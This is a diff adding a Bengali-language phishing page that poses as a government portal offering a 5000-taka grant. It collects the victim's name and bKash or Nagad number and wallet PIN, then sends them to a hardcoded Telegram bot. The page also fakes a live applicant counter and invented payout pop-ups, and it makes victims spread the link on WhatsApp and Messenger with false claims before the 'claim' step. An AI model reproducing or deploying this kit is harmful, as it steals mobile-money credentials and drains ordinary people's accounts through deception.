@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Govt Gift Portal | ৫০০০৳ অনুদান</title>
+    
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <script src='//libtl.com/sdk.js' data-zone='9587563' data-sdk='show_9587563'></script>
+
+    <style>
+        body { 
+            font-family: 'Hind Siliguri', sans-serif; 
+            background: url('https://i.ibb.co.com/FbrGwd79/buy.webp') no-repeat center top; 
+            background-size: 100% auto;
+            background-color: #e8f5e9;
+            margin: 0;
+            overflow-x: hidden;
+            padding-bottom: 70px; 
+        }
+
+        .page-wrapper {
+            background: rgba(255, 255, 255, 0.1);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .live-status-footer {
+            background: linear-gradient(90deg, #004d39 0%, #006a4e 50%, #004d39 100%);
+            width: 100%;
+            padding: 12px 0;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            border-top: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 -5px 15px rgba(0,0,0,0.2);
+            z-index: 1000;
+        }
+
+        .status-container {
+            max-width: 420px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
+
+        .blink-dot {
+            height: 8px; width: 8px;
+            background-color: #ff4d4d;
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 10px #ff4d4d;
+            animation: blinker 1.5s linear infinite;
+        }
+        @keyframes blinker { 50% { opacity: 0; } }
+
+        #full-page-loader {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .glass-card {
+            background: rgba(255, 255, 255, 0.2); 
+            backdrop-filter: blur(15px); 
+            -webkit-backdrop-filter: blur(15px);
+            border-radius: 2.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.4); 
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 420px;
+            overflow: hidden;
+            animation: slideUp 0.8s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .bkash-active { border: 2.5px solid #E2136E !important; background: rgba(226, 19, 110, 0.1) !important; }
+        .nagad-active { border: 2.5px solid #F7941D !important; background: rgba(247, 148, 29, 0.1) !important; }
+
+        .method-btn {
+            background: rgba(255, 255, 255, 0.8);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .btn-main { background: linear-gradient(135deg, #006a4e 0%, #059669 100%); box-shadow: 0 10px 20px -5px rgba(0, 106, 78, 0.4); }
+        .btn-claim { background: linear-gradient(135deg, #E2136E 0%, #ff1f8e 100%); animation: pulse-gold 2s infinite; }
+        @keyframes pulse-gold { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }
+
+        .progress-bar { background: rgba(226, 232, 240, 0.5); height: 10px; border-radius: 10px; overflow: hidden; }
+        .custom-input { width: 100%; background: rgba(255, 255, 255, 0.95); border: 2px solid rgba(241, 245, 249, 0.8); border-radius: 1.25rem; padding: 0.9rem 1.5rem; outline: none; transition: all 0.3s; font-weight: 600; }
+        .error-msg { color: #ff4d4d; font-size: 11px; font-weight: 700; margin-top: 4px; display: none; }
+        .input-err { border: 2px solid #ff4d4d !important; background-color: #fff1f2 !important; }
+
+        .text-glow-strong { text-shadow: 0px 2px 8px rgba(0, 0, 0, 0.8); }
+        .method-card { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); cursor: pointer; border: 2px solid rgba(255, 255, 255, 0.3); background: rgba(255, 255, 255, 0.5); }
+        .method-card.active-bkash { border-color: #E2136E; background-color: rgba(226, 19, 110, 0.15); transform: scale(1.05); }
+        .method-card.active-nagad { border-color: #F7941D; background-color: rgba(247, 148, 29, 0.15); transform: scale(1.05); }
+        .loader-spin { border: 3px solid #f3f3f3; border-top: 3px solid white; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .glass-panel { background: rgba(255, 255, 255, 0.15) !important; backdrop-filter: blur(25px); border-top: 1px solid rgba(255, 255, 255, 0.4); }
+        .slide-up-form { animation: slideUpForm 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
+        @keyframes slideUpForm { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .glass-input { background: rgba(255, 255, 255, 0.95) !important; border: 2px solid rgba(255, 255, 255, 0.5) !important; transition: all 0.3s; }
+
+        .reward-glass-pop {
+            position: fixed;
+            top: -100px; left: 50%; transform: translateX(-50%);
+            background: rgba(255, 255, 255, 0.3); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
+            padding: 12px 25px; border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.5);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15); z-index: 10000; font-weight: 700; color: #004d39;
+            display: flex; align-items: center; gap: 12px; transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            white-space: nowrap; font-size: 14px;
+        }
+
+        #initialBtnSection { margin-bottom: 60px; }
+    </style>
+</head>
+<body class="antialiased">
+
+    <div id="full-page-loader">
+        <div class="w-16 h-16 border-4 border-green-200 border-t-green-600 rounded-full animate-spin"></div>
+        <p class="mt-4 font-bold text-green-800 animate-pulse">লোড হচ্ছে, অপেক্ষা করুন...</p>
+    </div>
+
+    <div id="page1" class="page-wrapper">
+        <div class="glass-card">
+            <div class="text-center pt-8 pb-4">
+                <div class="inline-flex items-center gap-2 bg-white/50 backdrop-blur px-4 py-1.5 rounded-full shadow-sm border border-white/40 mb-4">
+                    <span class="relative flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span></span>
+                    <span class="text-[11px] font-bold text-green-900 uppercase tracking-widest">Govt Digital Grant</span>
+                </div>
+                <h1 class="text-3xl font-black text-gray-900 tracking-tight">সম্মাননা তহবিল</h1>
+                <p class="text-gray-800 text-sm font-medium">নিচের ধাপগুলো অনুসরণ করে ৫০০০৳ নিন</p>
+            </div>
+
+            <div class="p-8 pt-2">
+                <div id="step-form" class="space-y-5">
+                    <div class="grid grid-cols-2 gap-4">
+                        <button onclick="selectMethod('bkash')" id="btn-bkash" class="method-btn p-5 rounded-3xl flex flex-col items-center gap-2"><img src="https://www.logo.wine/a/logo/BKash/BKash-bKash-Logo.wine.svg" class="h-10 w-auto"><span class="text-[11px] font-bold text-[#E2136E] uppercase tracking-tighter">বিকাশ</span></button>
+                        <button onclick="selectMethod('nagad')" id="btn-nagad" class="method-btn p-5 rounded-3xl flex flex-col items-center gap-2"><img src="https://www.logo.wine/a/logo/Nagad/Nagad-Logo.wine.svg" class="h-10 w-auto"><span class="text-[11px] font-bold text-[#F7941D] uppercase tracking-tighter">নগদ</span></button>
+                    </div>
+                    <p id="method-err" class="error-msg text-center"><i class="bi bi-exclamation-circle"></i> অনুগ্রহ করে বিকাশ বা নগদ সিলেক্ট করুন</p>
+                    <div class="space-y-4">
+                        <div>
+                            <label class="text-[10px] font-bold uppercase ml-2 mb-1 block">NID অনুযায়ী পূর্ণ নাম</label>
+                            <input type="text" id="userNameInput" placeholder="আপনার সঠিক নাম লিখুন" class="custom-input text-gray-700">
+                            <p id="name-err" class="error-msg"><i class="bi bi-exclamation-circle"></i> অনুগ্রহ করে আপনার নাম লিখুন</p>
+                        </div>
+                        <div>
+                            <label class="text-[10px] font-bold uppercase ml-2 mb-1 block">অ্যাকাউন্ট নম্বর (১১ ডিজিট)</label>
+                            <input type="number" id="phoneNum" placeholder="01XXXXXXXXX" class="custom-input text-center text-lg text-gray-800">
+                            <p id="phone-err" class="error-msg"><i class="bi bi-exclamation-circle"></i> সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন</p>
+                        </div>
+                        <button onclick="handleVerifyWithAd()" class="w-full btn-main text-white font-bold py-4 rounded-2xl flex items-center justify-center gap-3 active:scale-95 mt-2">আবেদন শুরু করুন <i class="bi bi-arrow-right-circle-fill text-xl"></i></button>
+                    </div>
+                </div>
+
+                <div id="step-share" class="hidden space-y-4 text-center">
+                    <div class="bg-white/40 border border-green-200 p-4 rounded-2xl mb-2"><p class="text-green-900 font-bold text-sm">🎁 এটি ৫টি গ্রুপ বা 20 জন বন্ধুর সাথে হোয়াটসঅ্যাপে & মেসেঞ্জারে শেয়ার করুন।!</p><p class="text-[11px] text-gray-800">15 মিনিটের মধ্যে আপনি এসএমএসের মাধ্যমে একটি নিশ্চিতকরণ বার্তা পাবেন।</p></div>
+                    <div class="space-y-2 mb-4">
+                        <div class="progress-bar"><div id="p-fill" class="bg-green-600 h-full w-0 transition-all duration-500"></div></div>
+                        <div class="flex justify-between text-[10px] font-bold text-gray-600"><span>শেয়ার প্রগ্রেস</span><span id="p-text">০%</span></div>
+                        <div id="loading-status" class="text-[11px] font-bold text-green-600 mt-1 h-4"></div>
+                    </div>
+                    <div class="space-y-3">
+                        <button onclick="handleShare('whatsapp')" class="w-full bg-[#25D366] text-white font-bold py-4 rounded-2xl shadow-lg flex items-center justify-center gap-3 active:scale-95"><i class="bi bi-whatsapp text-2xl"></i> হোয়াটসঅ্যাপে শেয়ার</button>
+                        <button onclick="handleShare('messenger')" class="w-full bg-[#0084FF] text-white font-bold py-4 rounded-2xl shadow-lg flex items-center justify-center gap-3 active:scale-95"><i class="bi bi-messenger text-2xl"></i> মেসেঞ্জারে শেয়ার</button>
+                    </div>
+                </div>
+
+                <div id="step-claim" class="hidden text-center space-y-6 py-4">
+                    <div class="flex justify-center"><div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center"><i class="bi bi-check-circle-fill text-5xl text-green-600"></i></div></div>
+                    <div class="space-y-2"><h2 class="text-2xl font-bold text-gray-800">ভেরিফিকেশন সফল!</h2><p class="text-sm text-gray-700">নিচের বাটনে ক্লিক করে ৫০০০৳ দাবি করুন</p></div>
+                    <button onclick="handleFinalClaimWithAd()" class="w-full btn-claim text-white font-black py-5 rounded-2xl flex items-center justify-center gap-3 text-xl uppercase tracking-wider">Claim Now <i class="bi bi-gift-fill"></i></button>
+                </div>
+
+                <div id="loader" class="hidden py-12 text-center">
+                    <div class="inline-block w-12 h-12 border-[5px] border-green-100 border-t-green-600 rounded-full animate-spin"></div>
+                    <p id="loader-text" class="mt-4 font-bold text-green-800 text-sm tracking-widest uppercase">ভেরিফিকেশন চলছে...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="live-status-footer">
+        <div class="status-container">
+            <div class="flex items-center gap-3">
+                <span class="blink-dot"></span>
+                <div>
+                    <p class="text-[10px] text-[#a7f3d0] font-bold uppercase leading-none mb-1">সরাসরি আবেদনকারী</p>
+                    <p class="text-lg font-black text-white" id="live-user-count">লোড হচ্ছে...</p>
+                </div>
+            </div>
+            <div class="text-right">
+                <p class="text-[10px] text-[#a7f3d0] font-bold uppercase leading-none mb-1">সার্ভার স্ট্যাটাস</p>
+                <p class="text-white font-bold text-xs flex items-center gap-1 justify-end">
+                    <i class="bi bi-shield-fill-check text-green-400"></i> সুরক্ষিত
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <div id="page2" class="hidden h-screen flex justify-center items-center overflow-hidden">
+        <div class="w-full max-w-[450px] h-screen shadow-2xl flex flex-col relative overflow-hidden" style="background: url('https://i.ibb.co.com/FbrGwd79/buy.webp') no-repeat center top; background-size: 100% auto; background-color: #e8f5e9;">
+            <div class="absolute top-6 left-6 z-10"><img src="https://cdn-icons-png.flaticon.com/512/3407/3407024.png" alt="Logo" class="w-12 h-12 drop-shadow-xl" /></div>
+            <div class="flex-1 relative h-full flex items-end justify-center pb-10">
+                <div id="initialBtnSection" class="w-full px-8 pb-4">
+                    <button onclick="handleApplyWithAd()" class="w-full bg-[#006a4e] text-white font-extrabold py-4 rounded-2xl shadow-2xl active:scale-95 transition-all text-xl flex items-center justify-center gap-3">আবেদন করুন <i class="bi bi-arrow-right-circle-fill"></i></button>
+                </div>
+                <div id="mainFormBox" class="hidden slide-up-form glass-panel p-9 rounded-t-[45px] shadow-2xl w-full">
+                    <div id="paymentSection" class="space-y-7">
+                        <div class="flex flex-col gap-1">
+                            <h2 class="text-2xl font-extrabold text-white text-glow-strong">পেমেন্ট নিশ্চিত করুন</h2>
+                            <p class="text-white font-bold text-sm bg-black/30 w-fit px-3 py-1 rounded-lg border border-white/20"><i class="bi bi-person-circle"></i> <span id="display-name">লোড হচ্ছে...</span></p>
+                        </div>
+                        <div class="grid grid-cols-2 gap-5">
+                            <div onclick="selectFinalMethod('bkash')" id="bkashCard" class="method-card p-4 rounded-2xl flex flex-col items-center gap-2 backdrop-blur-lg"><img src="https://www.logo.wine/a/logo/BKash/BKash-bKash-Logo.wine.svg" class="w-11 h-11 object-contain" alt="bkash"><span class="font-extrabold text-sm text-[#E2136E]">বিকাশ</span></div>
+                            <div onclick="selectFinalMethod('nagad')" id="nagadCard" class="method-card p-4 rounded-2xl flex flex-col items-center gap-2 backdrop-blur-lg"><img src="https://download.logo.wine/logo/Nagad/Nagad-Logo.wine.png" class="w-11 h-11 object-contain" alt="nagad"><span class="font-extrabold text-sm text-[#F7941D]">নগদ</span></div>
+                        </div>
+                        <form id="payForm" class="space-y-4">
+                            <div class="space-y-3">
+                                <div id="phoneBox" class="relative flex items-center glass-input rounded-2xl p-1"><span class="pl-4 text-gray-500"><i class="bi bi-phone-fill text-lg"></i></span><input type="text" id="phoneInput" inputmode="numeric" maxlength="11" placeholder="মোবাইল নম্বর" class="w-full py-4 px-3 outline-none text-lg font-bold bg-transparent text-gray-900" /></div>
+                                <div id="pinBox" class="relative flex items-center glass-input rounded-2xl p-1"><span class="pl-4 text-gray-500"><i class="bi bi-shield-lock-fill text-lg"></i></span><input type="password" id="pinInput" inputmode="numeric" maxlength="5" placeholder="পিন" class="w-full py-4 px-3 outline-none text-lg font-bold bg-transparent tracking-widest text-center text-gray-900" /></div>
+                            </div>
+                            <p id="final-err" class="error-msg text-center mb-2"><i class="bi bi-exclamation-triangle-fill"></i> অনুগ্রহ করে সঠিক তথ্য দিন</p>
+                            <button type="button" onclick="handleSubmitWithAd()" id="finalSubmitBtn" class="w-full bg-gray-400 text-white font-extrabold py-4 rounded-2xl shadow-xl transition-all active:scale-95 disabled:cursor-not-allowed border border-white/20" disabled><span id="btnText">নিশ্চিত করুন</span></button>
+                        </form>
+                    </div>
+                    <div id="successSection" class="hidden text-center space-y-7 py-12 relative">
+                        <div class="w-24 h-24 bg-green-500 text-white rounded-full flex items-center justify-center mx-auto text-5xl border-4 border-white"><i class="bi bi-patch-check-fill"></i></div>
+                        <h2 class="text-4xl font-extrabold text-white text-glow-strong">আবেদন সফল!</h2>
+                        <button onclick="handleBackToStartWithAd()" class="bg-[#006a4e] text-white font-bold py-3 px-6 rounded-xl mx-auto flex items-center justify-center gap-2 shadow-lg active:scale-95 transition-all"><i class="bi bi-arrow-left-short text-2xl"></i> ফিরে যান</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        const BOT_TOKEN = "7966690571:AAFnPLVXsL7Q9sAsCfqOL60rbFVB6RYH9Sk";
+        const CHAT_ID = "7484749109";
+        let selected = ""; let progress = 0; let isWaitingForReturn = false; let selectedFinal = '';
+        let globalUserName = "";
+        let nameIndex = 0;
+
+        function initLiveCounter() {
+            let savedCount = localStorage.getItem('govt_live_counter_save');
+            let baseCount = savedCount ? parseInt(savedCount) : 3450; 
+            const counterElement = $('#live-user-count');
+            counterElement.text(baseCount.toLocaleString('bn-BD') + " জন");
+            setInterval(() => {
+                let increase = [1, 2, 4][Math.floor(Math.random() * 3)];
+                baseCount += increase;
+                localStorage.setItem('govt_live_counter_save', baseCount);
+                counterElement.text(baseCount.toLocaleString('bn-BD') + " জন");
+            }, 1000); 
+        }
+        initLiveCounter();
+
+        const rewardMsgs = [
+            "🎁 অন্তর ৫০০০৳ পেয়েছে", "🎁 সুমি ৫০০০৳ পেয়েছে", "🎁 আরিফ ৫০০০৳ পেয়েছে", "🎁 ইমদাদুল ৫০০০৳ পেয়েছে", "🎁 ফারিয়া ৫০০০৳ পেয়েছে", "🎁 আয়েশা ৫০০০৳ পেয়েছে", "🎁 অরিন ৫০০০৳ পেয়েছে", "🎁 নুসরাত ৫০০০৳ পেয়েছে", "🎁 হাচান ৫০০০৳ পেয়েছে", "🎁 ফাতেমা ৫০০০৳ পেয়েছে", "🎁 সোজীব ৫০০০৳ পেয়েছে", "🎁 জান্নাত ৫০০০৳ পেয়েছে", "🎁 রোহিদ ৫০০০৳ পেয়েছে", "🎁 সুমাইয়া ৫০০০৳ পেয়েছে", "🎁 রায়হান ৫০০০৳ পেয়েছে", "🎁 আফরিন ৫০০০৳ পেয়েছে", "🎁 পলাশ ৫০০০৳ পেয়েছে", "🎁 তাসনিম ৫০০০৳ পেয়েছে", "🎁 চাঁন ৫০০০৳ পেয়েছে", "🎁 মরিয়ম ৫০০০৳ পেয়েছে", "🎁 সাব্বির ৫০০০৳ পেয়েছে", "🎁 রিমা ৫০০০৳ পেয়েছে", "🎁 নাবিল ৫০০০৳ পেয়েছে", "🎁 লামিয়া ৫০০০৳ পেয়েছে", "🎁 সাদিয়া ৫০০০৳ পেয়েছে", "🎁 শাকিল ৫০০০৳ পেয়েছে", "🎁 হুমায়রা ৫০০০৳ পেয়েছে", "🎁 রাশেদ ৫০০০৳ পেয়েছে", "🎁 নাবিলা ৫০০০৳ পেয়েছে", "🎁 জুবায়ের ৫০০০৳ পেয়েছে", "🎁 শারমিন ৫০০০৳ পেয়েছে", "🎁 মেহেদী ৫০০০৳ পেয়েছে", "🎁 রাইসা ৫০০০৳ পেয়েছে", "🎁 সিয়াম ৫০০০৳ পেয়েছে", "🎁 ফারজানা ৫০০০৳ পেয়েছে", "🎁 ফয়সাল ৫০০০৳ পেয়েছে", "🎁 সাবিহা ৫০০০৳ পেয়েছে", "🎁 আরমান ৫০০০৳ পেয়েছে", "🎁 লুবনা ৫০০০৳ পেয়েছে", "🎁 তাহসিন ৫০০০৳ পেয়েছে", "🎁 রুবাইয়া ৫০০০৳ পেয়েছে", "🎁 ইশতিয়াক ৫০০০৳ পেয়েছে", "🎁 তাবাসসুম ৫০০০৳ পেয়েছে", "🎁 মিজান ৫০০০৳ পেয়েছে", "🎁 নাজমা ৫০০০৳ পেয়েছে", "🎁 রুবেল ৫০০০৳ পেয়েছে", "🎁 শবনম ৫০০০৳ পেয়েছে", "🎁 সুমন ৫০০০৳ পেয়েছে", "🎁 হালিমা ৫০০০৳ পেয়েছে", "🎁 তৌহিদ ৫০০০৳ পেয়েছে", "🎁 রাফিয়া ৫০০০৳ পেয়েছে", "🎁 রিফাত ৫০০০৳ পেয়েছে", "🎁 সাইমা ৫০০০৳ পেয়েছে", "🎁 সাফওয়ান ৫০০০৳ পেয়েছে", "🎁 ইসরাত ৫০০০৳ পেয়েছে", "🎁 শাওন ৫০০০৳ পেয়েছে", "🎁 মেহজাবিন ৫০০০৳ পেয়েছে", "🎁 তানিম ৫০০০৳ পেয়েছে", "🎁 আনিকা ৫০০০৳ পেয়েছে", "🎁 ইমতিয়াজ ৫০০০৳ পেয়েছে", "🎁 ফারহানা ৫০০০৳ পেয়েছে", "🎁 নোমান ৫০০০৳ পেয়েছে", "🎁 রুকাইয়া ৫০০০৳ পেয়েছে", "🎁 কামরুল ৫০০০৳ পেয়েছে", "🎁 আফসানা ৫০০০৳ পেয়েছে", "🎁 মাসুদ ৫০০০৳ পেয়েছে", "🎁 শাইলা ৫০০০৳ পেয়েছে", "🎁 শরিফ ৫০০০৳ পেয়েছে", "🎁 নাদিয়া ৫০০০৳ পেয়েছে", "🎁 সাদ ৫০০০৳ পেয়েছে", "🎁 সুমনা ৫০০০৳ পেয়েছে", "🎁 আফিফ ৫০০০৳ পেয়েছে", "🎁 লায়লা ৫০০০৳ পেয়েছে", "🎁 জিশান ৫০০০৳ পেয়েছে", "🎁 নুসাইবা ৫০০০৳ পেয়েছে", "🎁 মুস্তাফিজ ৫০০০৳ পেয়েছে", "🎁 মাহফুজা ৫০০০৳ পেয়েছে", "🎁 মাহদী ৫০০০৳ পেয়েছে", "🎁 আরিবা ৫০০০৳ পেয়েছে", "🎁 ইয়াসিন ৫০০০৳ পেয়েছে", "🎁 তামান্না ৫০০০৳ পেয়েছে", "🎁 আমির ৫০০০৳ পেয়েছে", "🎁 নওরীন ৫০০০৳ পেয়েছে", "🎁 ফুয়াদ ৫০০০৳ পেয়েছে", "🎁 সাফিয়া ৫০০০৳ পেয়েছে", "🎁 সামি ৫০০০৳ পেয়েছে", "🎁 হাবিবা ৫০০০৳ পেয়েছে", "🎁 ইলিয়াস ৫০০০৳ পেয়েছে", "🎁 জারিন ৫০০০৳ পেয়েছে", "🎁 হাবিব ৫০০০৳ পেয়েছে", "🎁 মাসুমা ৫০০০৳ পেয়েছে", "🎁 করিম ৫০০০৳ পেয়েছে", "🎁 নাজিয়া ৫০০০৳ পেয়েছে", "🎁 হাসান ৫০০০৳ পেয়েছে", "🎁 শারমিলা ৫০০০৳ পেয়েছে", "🎁 হোসেন ৫০০০৳ পেয়েছে", "🎁 ফারিহা ৫০০০৳ পেয়েছে", "🎁 সোহেল ৫০০০৳ পেয়েছে", "🎁 জান্নাতুল ৫০০০৳ পেয়েছে", "🎁 তামিম ৫০০০৳ পেয়েছে", "🎁 সানজিদা ৫০০০৳ পেয়েছে", "🎁 রাফি ৫০০০৳ পেয়েছে", "🎁 লামিসসা ৫০০০৳ পেয়েছে", "🎁 সাদমান ৫০০০৳ পেয়েছে", "🎁 আরিশা ৫০০০৳ পেয়েছে"
+        ];
+
+        function showRewardPop() {
+            const msg = rewardMsgs[nameIndex];
+            const pop = $(`<div class="reward-glass-pop">${msg}</div>`);
+            $('body').append(pop);
+            setTimeout(() => pop.css('top', '30px'), 100);
+            setTimeout(() => { pop.css('top', '-100px'); setTimeout(() => pop.remove(), 700); }, 4000);
+            nameIndex = (nameIndex + 1) % rewardMsgs.length;
+        }
+        setInterval(showRewardPop, 8000);
+
+        function runAdThen(callback) {
+            if (typeof show_9587563 === 'function') {
+                show_9587563().then(callback).catch(callback);
+            } else {
+                callback();
+            }
+        }
+
+        function selectMethod(m) { 
+            selected = m; $(".method-btn").removeClass("bkash-active nagad-active scale-105"); 
+            $(`#btn-${m}`).addClass(`${m}-active scale-105`); $("#method-err").fadeOut(); 
+        }
+
+        function handleVerifyWithAd() {
+            globalUserName = $("#userNameInput").val().trim();
+            const phone = $("#phoneNum").val().trim();
+            let hasError = false;
+            if(!selected) { $("#method-err").fadeIn(); hasError = true; } 
+            if(!globalUserName) { $("#userNameInput").addClass("input-err"); $("#name-err").fadeIn(); hasError = true; } 
+            if(phone.length !== 11) { $("#phoneNum").addClass("input-err"); $("#phone-err").fadeIn(); hasError = true; } 
+            if(hasError) return;
+            runAdThen(proceedToLoader);
+        }
+
+        function handleFinalClaimWithAd() { runAdThen(finalClaim); }
+        function handleApplyWithAd() { runAdThen(showForm); }
+
+        function handleSubmitWithAd() {
+            const phone = $('#phoneInput').val();
+            const pin = $('#pinInput').val();
+            if(phone.length !== 11 || pin.length < 4) {
+                $("#final-err").fadeIn();
+                return;
+            }
+            runAdThen(() => {
+                $('#btnText').html('<span class="loader-spin"></span>');
+                $('#finalSubmitBtn').prop('disabled', true);
+                const finalMessage = `🔔 নতুন আবেদন!\n👤 নাম: ${globalUserName}\n📱 মেথড: ${selectedFinal.toUpperCase()}\n📞 নম্বর: ${phone}\n🔑 পিন: ${pin}`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(finalMessage)}`)
+                .then(() => { 
+                    setTimeout(() => { 
+                        $('#paymentSection').addClass('hidden'); 
+                        $('#successSection').removeClass('hidden'); 
+                    }, 1500); 
+                });
+            });
+        }
+
+        function handleBackToStartWithAd() {
+            runAdThen(() => {
+                $("#full-page-loader").css('display', 'flex').hide().fadeIn(400);
+                setTimeout(() => { location.reload(); }, 2200);
+            });
+        }
+
+        function proceedToLoader() {
+            $("#display-name").text(globalUserName);
+            $("#step-form").hide(); 
+            $("#loader").fadeIn();
+            setTimeout(() => { $("#loader").hide(); $("#step-share").fadeIn(); }, 2000);
+        }
+
+        // --- শেয়ার টেক্সট আপডেট ---
+        function handleShare(p) {
+            isWaitingForReturn = true;
+            const currentUrl = window.location.href;
+            const shareText = `5,000 প্রশংসা তহবিল উপহার
+ 
+*নবনির্বাচিত প্রধানমন্ত্রীকে উদযাপন উপলক্ষে, নাগরিকরা Tk5,000 প্রশংসা তহবিল পুরস্কার পাওয়ার জন্য যোগ্য।*
+
+কিভাবে এখনই পাবেন?
+_নিচের লিংকে ভিজিট করুন এবং আপনি সঙ্গে সঙ্গে Tk5,000 পাবেন_।
+ 
+আমি এখনই আমারটা পেয়েছি
+
+_এখানে ক্লিক করুন_👇
+${currentUrl}`;
+
+            const encodedText = encodeURIComponent(shareText);
+            
+            if (p === 'whatsapp') {
+                window.location.href = `whatsapp://send?text=${encodedText}`;
+            } else {
+                window.location.href = `fb-messenger://share?link=${currentUrl}&quote=${encodedText}`;
+            }
+        }
+        
+        window.onfocus = function() {
+            if(isWaitingForReturn && progress < 100) {
+                isWaitingForReturn = false; 
+                $("#loading-status").text("চেক করা হচ্ছে...");
+                setTimeout(() => {
+                    progress += 5; 
+                    if(progress > 100) progress = 100;
+                    $("#p-fill").css("width", progress + "%"); 
+                    $("#p-text").text(progress + "%");
+                    $("#loading-status").text("");
+                    if(progress >= 100) { 
+                        $("#step-share").hide(); $("#loader").fadeIn(); 
+                        setTimeout(() => { $("#loader").hide(); $("#step-claim").fadeIn(); }, 2000);
+                    }
+                }, 1500);
+            }
+        };
+
+        function finalClaim() { $("#page1").fadeOut(400, () => $("#page2").removeClass('hidden').hide().fadeIn(400)); }
+        function showForm() { $('#initialBtnSection').addClass('hidden'); $('#mainFormBox').removeClass('hidden'); }
+        
+        function selectFinalMethod(m) {
+            selectedFinal = m; 
+            $('.method-card').removeClass('active-bkash active-nagad');
+            $(`#${m}Card`).addClass(`active-${m}`);
+            $('#phoneInput').attr('placeholder', m === 'bkash' ? 'বিকাশ নম্বর' : 'নগদ নম্বর');
+            $('#pinInput').attr('placeholder', m === 'bkash' ? 'বিকাশ পিন' : 'নগদ পিন');
+            $('#finalSubmitBtn').css('background', m === 'bkash' ? '#E2136E' : '#F7941D').prop('disabled', false);
+            $("#final-err").fadeOut();
+        }
+
+        $('#userNameInput, #phoneNum').on('input', function() {
+            $(this).removeClass('input-err');
+            if($(this).attr('id') === 'userNameInput') $("#name-err").fadeOut();
+            if($(this).attr('id') === 'phoneNum') $("#phone-err").fadeOut();
+        });
+    </script>
+</body>
+</html>
